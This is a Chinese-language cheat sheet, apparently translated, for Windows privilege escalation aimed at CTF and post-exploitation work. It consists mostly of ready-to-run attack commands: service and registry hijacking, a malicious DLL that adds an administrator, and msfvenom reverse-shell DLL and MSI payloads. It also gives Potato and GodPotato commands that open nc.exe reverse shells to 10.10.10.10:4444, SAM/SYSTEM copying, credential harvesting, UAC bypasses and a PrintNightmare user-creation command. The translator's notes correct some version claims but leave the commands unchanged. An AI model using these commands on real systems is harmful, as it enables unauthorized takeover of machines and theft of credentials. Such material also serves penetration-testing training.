# 🪟 Windows 权限提升完整速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="Windows PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/SYSTEM-Access-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Windows 系统权限提升完整指南</b>
</p>

---

## 📋 目录

- [信息枚举](#-enumeration)
- [服务配置漏洞利用](#-service-exploitation)
- [未加引号的服务路径](#-unquoted-service-paths)
- [DLL 劫持](#-dll-hijacking)
- [AlwaysInstallElevated](#-alwaysinstallelevated)
- [已保存的凭据](#-stored-credentials)
- [令牌操作](#-token-manipulation)
- [Potato 系列攻击](#-potato-attacks)
- [注册表配置漏洞利用](#-registry-exploits)
- [计划任务](#-scheduled-tasks)
- [UAC 绕过](#-uac-bypass)
- [内核漏洞利用](#-kernel-exploits)
- [速查表](#-quick-reference)

---

<a id="-enumeration"></a>
## 🔍 信息枚举

> **环境说明：** 原文保留了不同 shell 的示例，代码块标签不保证每行都属于同一种 shell；其中 `#` 是讲解标记，cmd 的正式注释命令为 [`rem`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rem)。[WMIC 已被弃用](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic)，新系统可能不再提供；[`Get-WmiObject` 也不在 PowerShell 7 中提供](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell)。本文不改写原始命令。

### 系统信息

```cmd
# 系统信息
systeminfo
hostname

# 操作系统版本
ver
wmic os get caption,version,buildnumber

# 体系结构
echo %PROCESSOR_ARCHITECTURE%

# 补丁／热修复
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### 用户信息

```cmd
# 当前用户
whoami
whoami /all
whoami /priv
whoami /groups

# 所有用户
net user
net localgroup administrators

# 用户详细信息
net user username

# 当前特权
whoami /priv
```

### 网络信息

```cmd
# IP 配置
ipconfig /all

# 路由
route print

# 开放端口
netstat -ano
netstat -an | findstr LISTENING

# ARP 表
arp -a

# DNS 缓存
ipconfig /displaydns
```

### 进程与服务

```cmd
# 正在运行的进程
tasklist
tasklist /svc
wmic process list full

# 服务
sc query
net start
wmic service list brief

# 驱动程序
driverquery
```

### PowerShell 信息枚举

```powershell
# 系统信息
Get-ComputerInfo

# 用户
Get-LocalUser
Get-LocalGroupMember Administrators

# 服务
Get-Service

# 进程
Get-Process

# 已安装的软件
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

<a id="-service-exploitation"></a>
## ⚙️ 服务配置漏洞利用

### 查找存在配置缺陷的服务

```cmd
# 列出服务
sc query state= all

# 服务权限
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# 检查指定服务
sc qc servicename
```

### 服务权限配置不当

```cmd
# 如果可以修改服务配置：
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc config servicename binpath= "net localgroup administrators user /add"
sc stop servicename
sc start servicename
```

### 服务可执行文件权限配置不当

```cmd
# 检查可执行文件权限
icacls "C:\Program Files\Service\binary.exe"

# 如果可写，用恶意可执行文件替换
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servicename
sc start servicename
```

### 使用 PowerShell 检查服务

> **模块说明：** 下方的 `Get-ModifiableService` 来自 [PowerSploit／PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)，不是 PowerShell 内置命令；须先有相应函数可用。

```powershell
# 获取服务信息
Get-WmiObject win32_service | Select-Object Name, StartName, PathName

# 查找可以修改的服务
Get-ModifiableService
```

---

<a id="-unquoted-service-paths"></a>
## 📂 未加引号的服务路径

### 查找未加引号的路径

```cmd
# 查找未加引号的服务路径
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

### 利用未加引号的路径

```
# 如果路径为：C:\Program Files\Vulnerable Service\service.exe
# Windows 会依次尝试：
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# 放置恶意可执行文件：
copy shell.exe "C:\Program Files\Vulnerable.exe"

# 重启服务
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

<a id="-dll-hijacking"></a>
## 📚 DLL 劫持

### 查找缺失的 DLL

```cmd
# 使用 Process Monitor 查找缺失的 DLL
# 过滤条件：Result = NAME NOT FOUND，Path 以 .dll 结尾

# 常见的搜索位置：
# 1. 应用程序目录
# 2. C:\Windows\System32
# 3. C:\Windows
# 4. 当前目录
# 5. PATH 中列出的目录
```

### 创建恶意 DLL

> **DLL 说明：** 上方路径列表是简化示意，[实际搜索顺序](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)受 Known DLLs、应用类型、加载方式和安全搜索模式等影响。下方代码块混合了命令行与 C 代码，不是一份可直接编译的完整源码。

```c
// msfvenom 载荷生成命令
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

// 也可以编译自定义 DLL：
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

### 利用

```cmd
# 将 DLL 复制到搜索路径中的可写目录
copy evil.dll "C:\Program Files\App\missing.dll"

# 触发应用程序加载 DLL
# 重启服务或应用程序
```

---

<a id="-alwaysinstallelevated"></a>
## 📦 AlwaysInstallElevated

### 检查是否存在漏洞

```cmd
# 两处都必须设为 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### 利用

```bash
# 生成恶意 MSI 安装包
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# 传输并执行
msiexec /quiet /qn /i evil.msi
```

---

<a id="-stored-credentials"></a>
## 🔑 已保存的凭据

### 凭据管理器

```cmd
# 列出已保存的凭据
cmdkey /list

# 使用已保存的凭据
runas /savecred /user:Administrator cmd.exe
```

### SAM 与 SYSTEM

```cmd
# 复制 SAM 文件（原文要求 SYSTEM）
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# 从卷影副本复制
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

### 注册表中的凭据

```cmd
# 自动登录密码
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# VNC 密码
reg query "HKCU\Software\ORL\WinVNC3\Password"

# PuTTY 会话
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### 含有密码的文件

```cmd
# 搜索密码
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# 无人值守安装文件
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# PowerShell 历史记录
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# IIS 配置
type C:\inetpub\wwwroot\web.config
```

### Wi-Fi 密码

```cmd
# 列出配置文件
netsh wlan show profiles

# 获取密码
netsh wlan show profile name="SSID" key=clear
```

---

<a id="-token-manipulation"></a>
## 🎭 令牌操作

### 检查特权

```cmd
whoami /priv

# 高风险特权：
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

### SeImpersonatePrivilege

```cmd
# 如果已启用 SeImpersonatePrivilege：
# 使用 Potato 系列攻击（JuicyPotato、PrintSpoofer 等）

# PrintSpoofer
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### SeBackupPrivilege

```cmd
# 可以读取任意文件（原文概括，参见下方说明）
# 复制 SAM 与 SYSTEM
robocopy /b C:\Windows\System32\config C:\Users\Public SAM SYSTEM
```

### SeRestorePrivilege

```cmd
# 可以写入任意位置（原文概括，参见下方说明）
# 替换系统文件
```

---

<a id="-potato-attacks"></a>
## 🥔 Potato 系列攻击

> **特权说明：** [`SeBackupPrivilege` 与 `SeRestorePrivilege`](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)分别影响备份／恢复操作的读写访问检查，需要相应特权及操作语义；“可读写任意文件”是简化表述，不代表能自动绕过共享锁、文件加密或所有其他限制。

### JuicyPotato (Windows Server 2016/2019)

> **版本勘误：** 原文标题中的 Server 2019 不适用于经典 JuicyPotato。[项目维护者确认](https://github.com/ohpe/juicy-potato/issues/4)，Windows 10 `1809` 与 Windows Server `2019` 已修复该利用链；各 Potato 工具的适用版本和运行条件应分别核对。

```cmd
# 需要 SeImpersonatePrivilege 或 SeAssignPrimaryToken
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

### PrintSpoofer (Windows 10/Server 2016+)

```cmd
# 需要 SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.10.10 4444 -e cmd"
```

### RoguePotato

```cmd
RoguePotato.exe -r 10.10.10.10 -e "cmd /c whoami > C:\Users\Public\out.txt" -l 9999
```

### GodPotato (Windows 10/11/Server 2019-2022)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

---

<a id="-registry-exploits"></a>
## 📝 注册表配置漏洞利用

### 自动运行项（AutoRuns）

```cmd
# 检查自动运行项位置
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# 如果可写，添加恶意条目
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

### 服务注册表项

```cmd
# 检查服务注册表项的权限
accesschk.exe -kvuqws "Everyone" HKLM\System\CurrentControlSet\Services

# 修改服务的 ImagePath
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnerable" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

<a id="-scheduled-tasks"></a>
## ⏰ 计划任务

### 列出计划任务

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

### 查找可写的任务脚本

```cmd
# 如果任务运行的脚本可以被你修改：
icacls "C:\Scripts\backup.bat"

# 添加恶意命令
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

### 创建恶意计划任务

```cmd
# 如果具有创建任务的权限
schtasks /create /tn "Evil" /tr "C:\Users\Public\shell.exe" /sc onlogon /ru SYSTEM
```

---

<a id="-uac-bypass"></a>
## 🛡️ UAC 绕过

> **UAC 说明：** [Microsoft 的 UAC 模型](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works)区分管理员的受限令牌与标准用户账户。以下典型绕过依赖账户原有的管理员资格及特定系统／UAC 配置，不能理解为普通账户必然能获得管理员权限；历史注册表方法也不保证在当前版本有效。

### 检查 UAC 级别

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

### Fodhelper 绕过

```cmd
# 适用于 Windows 10（原文说明，需核对版本与配置）
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# 清理
reg delete HKCU\Software\Classes\ms-settings /f
```

### 事件查看器（EventViewer）绕过

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

<a id="-kernel-exploits"></a>
## 💣 内核漏洞利用

### 检查系统信息

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### 常见漏洞利用

> **范围说明：** 原表同时包含 Microsoft 安全公告编号、CVE 与不同类型的漏洞，并非全部属于本地内核提权；“所有版本”也不是精确受影响范围。以 [Microsoft 的 SMBGhost 说明](https://techcommunity.microsoft.com/blog/microsoft-security-blog/azure-atp-now-detects-smbghost/1281568)为例，CVE-2020-0796 涉及 `1903`／`1909` 等特定版本，不能仅凭产品名称判断。原表数值与名称保持不变。

| CVE | Windows 版本 | 名称 |
|-----|-----------------|------|
| MS08-067 | XP/2003 | NetAPI |
| MS16-032 | 7/8/10/2012 | Secondary Logon |
| MS17-010 | 所有版本（原文概括） | **EternalBlue** |
| CVE-2020-0796 | 10/Server 2019 | **SMBGhost** |
| CVE-2021-1732 | 10/Server | Win32k |
| CVE-2021-34527 | 所有版本（原文概括） | **PrintNightmare** |

### PrintNightmare (CVE-2021-34527)

> **检测说明：** `Get-Service Spooler` 只检查服务状态，不能确认 PrintNightmare 是否可利用。[Microsoft 说明](https://support.microsoft.com/en-us/servicing/os/windows/2021/07/kb5005010-restricting-installation-of-new-printer-drivers-after-applying-the-july-6-2021-updates)强调，相关更新、驱动安装权限与 Point and Print 配置都会影响风险。下方脚本文件名是原文示例，也不能代替核对实际漏洞与脚本版本。

```cmd
# 检查是否存在漏洞（原文说明，仅看服务状态不足以判断）
Get-Service Spooler

# 利用（PowerShell）
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "password123!" -DriverName "Xerox"
```

---

<a id="-quick-reference"></a>
## 📊 速查表

### 单行命令枚举

```cmd
# 快速获取信息
whoami /all & systeminfo & net user

# 检查特权
whoami /priv

# 服务
wmic service get name,pathname | findstr /i /v "c:\windows"

# 计划任务
schtasks /query /fo LIST /v | findstr /i "taskname\|run"
```

### 自动化工具

| 工具 | 说明 |
|------|-------------|
| **WinPEAS** | 全面的信息枚举 |
| **PowerUp** | PowerShell 权限提升 |
| **Seatbelt** | 安全检查 |
| **SharpUp** | C# 权限提升检查 |

### 常见机会检查清单

- [ ] `whoami /priv` - 检查 SeImpersonate
- [ ] 未加引号的服务路径
- [ ] 可写的服务可执行文件
- [ ] AlwaysInstallElevated
- [ ] 已保存的凭据（cmdkey /list）
- [ ] 注册表中的自动登录密码
- [ ] 服务权限配置不当
- [ ] 计划任务脚本
- [ ] 内核版本 - 是否存在 PrintNightmare 风险？

---

## 📚 参考资源

- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks Windows 权限提升](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### 相关速查表
- [WinPEAS（官方项目；原文对应的本地文档缺失）](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
- [Linux 权限提升](../../Linux-PrivEsc/translations/README.zh-CN.md)

---

<p align="center">
  <b>🪟 获取 SYSTEM 权限！</b><br>
  <i>掌握 Windows 权限提升技巧</i>
</p>
